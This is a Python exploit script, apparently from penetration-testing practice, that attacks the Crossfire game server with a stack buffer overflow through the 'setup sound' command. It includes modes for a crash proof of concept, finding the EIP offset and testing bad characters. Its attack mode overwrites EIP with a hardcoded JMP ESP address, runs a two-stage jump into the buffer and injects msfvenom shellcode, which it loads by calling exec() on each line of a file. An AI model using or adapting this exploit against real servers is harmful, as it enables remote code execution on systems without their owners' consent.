#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" crossfire.py

Pwn Crossfire with a buffer overflow.

"""

from __future__ import division, print_function, absolute_import

import string
import socket
import struct


def pwn(ip, port, payload):
    """ Pwn crossfire with a buffer overflow attack

    """
    timeout = 120
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)

    offset = 4368
    buffer_length = 4379
    if payload == 'proof':
        buf = concept(buffer_length)
    elif payload == 'unique':
        buf = unique()
    elif isinstance(payload, int):
        buf = bin_search(payload, buffer_length)
    elif payload == 'test':
        buf = test(offset)
    elif payload == 'chars':
        buf = bad_chars(buffer_length)
    elif payload == 'break':
        buf = breakpoint(offset)
    else:
        buf = attack(offset, payload)
        
    try:
        print("[*] Sending evil buffer...")
        s.connect((ip, int(port)))
        data = s.recv(1024)
        print("[*] Banner: {}".format(data.strip(), end=''))
        s.send(buf)
        print("[*] Done")
    except socket.timeout:
        print("[*] ERROR: Socket timeout at {} seconds... aborting".format(timeout))
    except socket.error:
        print("[*] ERROR: Cannot connect to server on IP {}:{}".format(ip, port))

    s.close()


def concept(buffer_length):
    """ Proof of concept for buffer overflow.

    """
    print("[*] Payload set as given proof of concept")

    crash = '\x41' * buffer_length

    buf = '\x11(setup sound ' 
    buf += crash
    buf += '\x90\x00#'

    return buf


def unique():
    """ Send a unique string to determine the offset to the EIP register.

    """
    print("[*] Payload set as unique string")

    with open('data/unique_4379byte_string.dat') as unique:
        payload = unique.read().strip()

    buf = '\x11(setup sound ' 
    buf += payload
    buf += '\x90\x00#'

    return buf


def bin_search(depth, buffer_length):
    """ Create a buffer with evenly split number of chars.

    """
    assert(depth <= 26)

    buf = '\x11(setup sound '
    for letter in range(depth):
        buf += string.ascii_uppercase[letter] * int((buffer_length/depth))
    buf += '\x90\x00#'

    return buf


def test(offset):
    """ Test offset

    """
    print("[*] Payload set to only overwrite the EIP")

    buf = '\x11(setup sound ' 
    buf += '\x41' * offset 
    buf += struct.pack('<L', 0x42424242)
    buf += '\x43' * 7
    buf += '\x90\x00#'

    return buf


def bad_chars(buffer_length):
    """ Test for bad characters

    """
    # Removed chracters: 
    # 0x00 (Null)
    # 0x0A (New Line '\n')
    # 0x0D (Carriage Return '\r')
    # 0x20 (ASCII Space)
    good_chars = (
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
        "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
        "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
        "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
        "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

    print("[*] Payload set to test {} chars for incompatability".format(len(good_chars)))

    buf = '\x11(setup sound ' 
    buf += good_chars
    buf += 'A' * (buffer_length - len(good_chars))
    buf += '\x90\x00#'

    return buf


def breakpoint(offset):
    """ Overwrite EIP and set breakpoint on entry to shell code section

    """
    print("[*] Payload set to breakpoint on entry to shellcode section")

    buf = '\x11(setup sound ' 
    buf += '\xcc' * 8                       # Break points in stage two of payload
    buf += '\x41' * (offset - 8)            # Offset to EIP overwrite
    buf += struct.pack('<L', 0x08134597)    # Overwrite EIP with address to JMP ESP
    buf += '\x83\xc0\x0c'                   # ADD EAX,12 - pointer past 'setup sound'
    buf += '\xff\xe0'                       # JMP EAX
    buf += '\x90\x90'
    buf += '\x90\x00#'

    return buf


def attack(offset, payload):
    """ Execute stage one and stage two shellcode.

    Overwriting past the range here causes the program to crash differently, so
    there are two stages of shellcode. The EIP register is overwritten to
    execute a JMP ESP command which brings us to the instruction directly after
    the offset and EIP overwrite, then stage one shellcode increments the EAX
    register which is pointing at the base of the buffer by 12 which sets it
    to just after the '\x11(setup sound ' string. Then stage two shellcode can
    be added to execute the desired payload.

    """
    print("[*] Payload set to attack")

    shellcode = get_shellcode(payload)
    print("[*] Read {} byte shellcode payload".format(len(shellcode)))

    buf = '\x11(setup sound ' 
    buf += shellcode                            # Inject shellcode
    buf += '\x41' * (offset-len(shellcode))     # Offset to EIP overwrite
    buf += struct.pack('<L', 0x08134597)        # Overwrite EIP with address to JMP ESP
    buf += '\x83\xc0\x0c'                       # ADD EAX,12 - pointer past 'setup sound'
    buf += '\xff\xe0'                           # JMP EAX - go to stage 2 (shellcode)
    buf += '\x90\x90'                           # OPcode padding
    buf += '\x90\x00#'

    crash = shellcode + "\x41" * (4368-105) + '\x97\x45\x13\x08' + "\x83\xc0\x0c\xff\xe0\x90\x90"
    buf = '\x11(setup sound ' + crash + '\x90\x00#'

    return buf


def get_shellcode(location):
    """ Read an msfvenom genterated shellcode file and format it to be sent.

    """
    with open(location) as shellfile:
        for line in shellfile:
            exec(line)

    return buf
